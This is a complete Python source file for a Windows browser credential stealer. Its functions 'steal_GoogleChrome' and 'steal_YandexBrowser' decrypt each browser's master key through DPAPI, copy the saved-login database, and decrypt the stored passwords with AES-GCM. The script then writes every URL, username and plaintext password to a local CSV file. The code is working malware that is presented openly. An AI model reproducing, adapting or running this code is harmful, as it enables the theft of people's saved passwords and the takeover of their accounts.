#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import json
import base64
import sqlite3
import shutil

import win32crypt
from Crypto.Cipher import AES

# Global variables
out_file_name = "UserData.csv"
temp_db = "temp_db.db"

chrome_user_data_path = os.path.normpath(os.getenv("LOCALAPPDATA") + "/Google/Chrome/User Data")
chrome_login_data_path = os.path.join(chrome_user_data_path, "Default", "Login Data")
chrome_key_path = os.path.join(chrome_user_data_path, "Local State")

yandex_user_data_path = os.path.normpath(os.getenv("LOCALAPPDATA") + "/Yandex/YandexBrowser/User Data")
yandex_login_data_path = os.path.join(yandex_user_data_path, "Default", "Ya Passman Data")
yandex_key_path = os.path.join(yandex_user_data_path, "Local State")

def steal_GoogleChrome():
    with open(chrome_key_path, 'r', encoding='utf-8') as file:
        data = json.load(file)
        encrypted_key = data['os_crypt']['encrypted_key']

    encrypted_key = base64.b64decode(encrypted_key)

    # Key prefix for a key encrypted with DPAPI.
    DPAPI_key_prefix = "DPAPI"

    encrypted_key = encrypted_key[len(DPAPI_key_prefix):]

    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    shutil.copyfile(chrome_login_data_path, temp_db)

    except_appeared = False
    try:
        conn = sqlite3.connect(temp_db)

        curs = conn.cursor()
        curs.execute("SELECT origin_url, username_value, password_value FROM logins")

        login_data = curs.fetchall()
    except sqlite3.DatabaseError as err:
        except_appeared = True
        print("Error with Google Chrome: ", err)
    finally:
        conn.close()

    if except_appeared:
        return False

    if not login_data:
        print("No userdata stored in Google Chrome")
        return False

    # Version prefix for data encrypted with profile bound key
    version_prefix = "v10";

    iv_length = 12; # 96 / 8
    auth_tag_length = 16; # 128 / 8

    with open(out_file_name, 'a') as file:
        file.write("Google Chrome\n\n")
        file.write("url;username;password\n")
        for raw in login_data:
            line = ";".join(raw[:-1])
            encrypted_password = raw[2]

            encrypted_password = encrypted_password[len(version_prefix):]
            iv = encrypted_password[:iv_length]
            auth_tag = encrypted_password[-auth_tag_length:]
            encrypted_password = encrypted_password[iv_length:-auth_tag_length]

            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=iv)
            password = cipher.decrypt_and_verify(encrypted_password, auth_tag)
            password = password.decode("utf-8")

            line = line + ";{}".format(password)
            file.write(line + "\n")
        file.write("\n")

    return True

def steal_YandexBrowser():
    with open(yandex_key_path, 'r', encoding='utf-8') as file:
        data = json.load(file)
        encrypted_key = data['os_crypt']['encrypted_key']

    encrypted_key = base64.b64decode(encrypted_key)

    # Key prefix for a key encrypted with DPAPI.
    DPAPI_key_prefix = "DPAPI"

    encrypted_key = encrypted_key[len(DPAPI_key_prefix):]

    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

    shutil.copyfile(yandex_login_data_path, temp_db)

    except_appeared = False
    try:
        conn = sqlite3.connect(temp_db)

        curs = conn.cursor()
        curs.execute("SELECT origin_url, username_value, password_value FROM logins")

        login_data = curs.fetchall()
    except sqlite3.DatabaseError as err:
        except_appeared = True
        print("Error with Yandex browser: ", err)
    finally:
        conn.close()

    if except_appeared:
        return False

    if not login_data:
        print("No userdata stored in Yandex browser")
        return False

    iv_length = 12; # 96 / 8
    auth_tag_length = 16; # 128 / 8

    with open(out_file_name, 'a') as file:
        file.write("Yandex browser\n\n")
        file.write("url;username;password\n")
        for raw in login_data:
            line = ";".join(raw[:-1])
            encrypted_password = raw[2]

            iv = encrypted_password[:iv_length]
            auth_tag = encrypted_password[-auth_tag_length:]
            encrypted_password = encrypted_password[iv_length:-auth_tag_length]

            cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=iv)
            password = cipher.decrypt_and_verify(encrypted_password, auth_tag)
            password = password.decode("utf-8")

            line = line + ";{}".format(password)
            file.write(line + "\n")
        file.write("\n")

    return True

def main():
    print("Console app that searches for browser user data and writes it to a .csv file\n")

    # Create or truncate files
    open(out_file_name, 'w', encoding='utf-8').close()
    open(temp_db, 'w', encoding='utf-8').close()

    installed_browsers = []

    if os.path.exists(chrome_login_data_path):
        installed_browsers.append("Google Chrome")
    if os.path.exists(yandex_login_data_path):
        installed_browsers.append("Yandex browser")

    if not installed_browsers:
        sys.exit("Couldn't find any browsers on your computer")

    print("Detected browsers:")
    for browser in installed_browsers:
        print(browser)
    print()

    at_least_one = False
    if "Google Chrome" in installed_browsers:
        try:
            if steal_GoogleChrome():
                at_least_one = True
        except Exception as e:
            print("Error with Google Chrome: ", e)
    if "Yandex browser" in installed_browsers:
        try:
            if steal_YandexBrowser():
                at_least_one = True
        except Exception as e:
            print("Error with Yandex browser: ", e)

    if at_least_one:
        print("\nFile \"{}\" has been successfully created".format(out_file_name))
    else:
        os.remove(out_file_name)

    os.remove(temp_db)

if __name__ == "__main__":
    main()
